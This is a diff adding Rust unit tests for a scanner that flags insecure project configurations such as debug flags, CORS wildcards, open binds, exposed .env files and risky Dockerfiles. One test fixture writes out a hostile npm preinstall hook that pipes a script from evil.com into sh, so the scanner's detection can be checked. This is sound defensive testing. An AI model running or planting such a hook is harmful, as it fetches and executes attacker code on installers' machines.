@@ -695,9 +695,266 @@ mod tests {
     }
 
     #[test]
+    fn test_subdir_dockerfile_and_cors_scanned() {
+        // The subdirectory pass re-runs the Dockerfile and CORS scanners on
+        // each non-hidden child dir.
+        let dir = setup_project(&[
+            (
+                "backend/Dockerfile",
+                "FROM python:3.11\nUSER root\nCMD [\"python\"]",
+            ),
+            ("frontend/server.js", "app.use(cors())"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(
+            findings.iter().any(|f| f.title.contains("root")),
+            "subdir Dockerfile must be scanned"
+        );
+        assert!(
+            findings.iter().any(|f| f.title.contains("CORS")),
+            "subdir JS CORS must be scanned"
+        );
+    }
+
+    #[test]
     fn test_empty_project() {
         let dir = TempDir::new().unwrap();
         let findings = scan_insecure_configs(dir.path());
         assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_rule_count_is_six() {
+        assert_eq!(rule_count(), 6);
+    }
+
+    // --- Debug mode: extra branches ---
+
+    #[test]
+    fn test_django_debug_in_settings_package() {
+        // settings/production.py variant of the Django settings paths.
+        let dir = setup_project(&[("settings/production.py", "DEBUG = True")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("Django DEBUG")));
+    }
+
+    #[test]
+    fn test_django_debug_commented_out_no_finding() {
+        let dir = setup_project(&[("settings.py", "# DEBUG = True\nDEBUG = False\n")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("Django DEBUG")));
+    }
+
+    #[test]
+    fn test_flask_debug_spaced_assignment() {
+        // "debug = True" (spaced) in run.py must also be flagged.
+        let dir = setup_project(&[("run.py", "app.run(host='127.0.0.1', debug = True)")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("Flask debug")));
+    }
+
+    #[test]
+    fn test_node_env_cross_env_no_finding() {
+        let dir = setup_project(&[(
+            "package.json",
+            r#"{"scripts":{"start":"cross-env NODE_ENV=production node server.js"}}"#,
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("NODE_ENV")));
+    }
+
+    #[test]
+    fn test_node_start_non_server_script_no_finding() {
+        // "node build.js" is not a server entry point -> no warning.
+        let dir = setup_project(&[("package.json", r#"{"scripts":{"start":"node build.js"}}"#)]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("NODE_ENV")));
+    }
+
+    #[test]
+    fn test_invalid_package_json_no_panic() {
+        let dir = setup_project(&[("package.json", "{ this is not json")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.is_empty(), "invalid JSON must be ignored");
+    }
+
+    // --- CORS: extra branches ---
+
+    #[test]
+    fn test_cors_fastapi_allow_origins_wildcard() {
+        let dir = setup_project(&[(
+            "main.py",
+            "app.add_middleware(CORSMiddleware, allow_origins=[\"*\"])",
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("CORS")));
+    }
+
+    #[test]
+    fn test_cors_python_origins_with_cors_context() {
+        // Generic "origins" + wildcard + "cors" mention in the same line.
+        let dir = setup_project(&[("config.py", "cors_origins = [\"*\"]")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("CORS")));
+    }
+
+    #[test]
+    fn test_cors_js_wildcard_origin() {
+        let dir = setup_project(&[("app.js", "app.use(cors({ origin: '*' }));")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("CORS")));
+    }
+
+    #[test]
+    fn test_cors_header_wildcard() {
+        let dir = setup_project(&[(
+            "index.js",
+            "res.setHeader('Access-Control-Allow-Origin', '*');",
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("CORS")));
+    }
+
+    #[test]
+    fn test_cors_commented_out_no_finding() {
+        let dir = setup_project(&[("server.js", "// app.use(cors())")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("CORS")));
+    }
+
+    // --- Bind scan: skip branches ---
+
+    #[test]
+    fn test_bind_scan_skips_dependency_and_hidden_dirs() {
+        let dir = setup_project(&[
+            ("node_modules/server.js", "listen('0.0.0.0')"),
+            (".hidden/main.py", "host = '0.0.0.0'"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(
+            !findings.iter().any(|f| f.title.contains("0.0.0.0")),
+            "got: {:?}",
+            findings.iter().map(|f| &f.title).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_bind_scan_respects_depth_limit() {
+        // Max depth for the bind scan is 3; depth 4 must not be scanned.
+        let dir = setup_project(&[("a/b/c/d/main.py", "app.run(host='0.0.0.0')")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("0.0.0.0")));
+    }
+
+    #[test]
+    fn test_bind_scan_ignores_js_comments() {
+        let dir = setup_project(&[("server.js", "// listen on 0.0.0.0 for docker\nconst x = 1;")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("0.0.0.0")));
+    }
+
+    // --- .env: extra branches ---
+
+    #[test]
+    fn test_env_with_sample_counts_as_example() {
+        let dir = setup_project(&[
+            (".env", "SECRET=value"),
+            (".env.sample", "SECRET="),
+            (".gitignore", ".env"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains(".env.example")));
+    }
+
+    #[test]
+    fn test_env_without_gitignore_file() {
+        let dir = setup_project(&[(".env", "SECRET=value"), (".env.example", "SECRET=")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.title.contains("Missing .gitignore"))
+        );
+    }
+
+    #[test]
+    fn test_gitignore_wildcard_env_pattern_accepted() {
+        let dir = setup_project(&[
+            (".env", "SECRET=value"),
+            (".env.example", "SECRET="),
+            (".gitignore", ".env*\nnode_modules"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.title.contains("is not in .gitignore"))
+        );
+    }
+
+    // --- Dockerfile: extra branches ---
+
+    #[test]
+    fn test_dockerfile_add_all_without_dockerignore() {
+        let dir = setup_project(&[(
+            "Dockerfile",
+            "FROM node:20\nADD . .\nUSER node\nCMD [\"node\", \"app.js\"]",
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("COPY . .")));
+    }
+
+    #[test]
+    fn test_dockerfile_copy_all_with_dockerignore_no_finding() {
+        let dir = setup_project(&[
+            (
+                "Dockerfile",
+                "FROM node:20\nCOPY . .\nUSER node\nCMD [\"node\", \"app.js\"]",
+            ),
+            (".dockerignore", ".env\n.git\nnode_modules"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("COPY . .")));
+    }
+
+    // --- package.json supply chain: extra branches ---
+
+    #[test]
+    fn test_suspicious_preinstall_wget() {
+        let dir = setup_project(&[(
+            "package.json",
+            r#"{"scripts":{"preinstall":"wget https://evil.com/x.sh -O- | sh"}}"#,
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("preinstall")));
+    }
+
+    // --- Subdirectory skip branches ---
+
+    #[test]
+    fn test_skips_hidden_and_dependency_subdirs() {
+        let dir = setup_project(&[
+            (".hidden/settings.py", "DEBUG = True"),
+            ("node_modules/settings.py", "DEBUG = True"),
+            ("__pycache__/settings.py", "DEBUG = True"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(
+            !findings.iter().any(|f| f.title.contains("Django DEBUG")),
+            "got: {:?}",
+            findings.iter().map(|f| &f.title).collect::<Vec<_>>()
+        );
+    }
+
+    // --- Large file guard ---
+
+    #[test]
+    fn test_large_config_files_skipped() {
+        // Files above 1MB must be skipped by read_file_if_exists.
+        let padding = "# padding\n".repeat(120_000); // ~1.2MB
+        let content = format!("{}DEBUG = True\n", padding);
+        let dir = setup_project(&[("settings.py", &content)]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("Django DEBUG")));
     }
 }
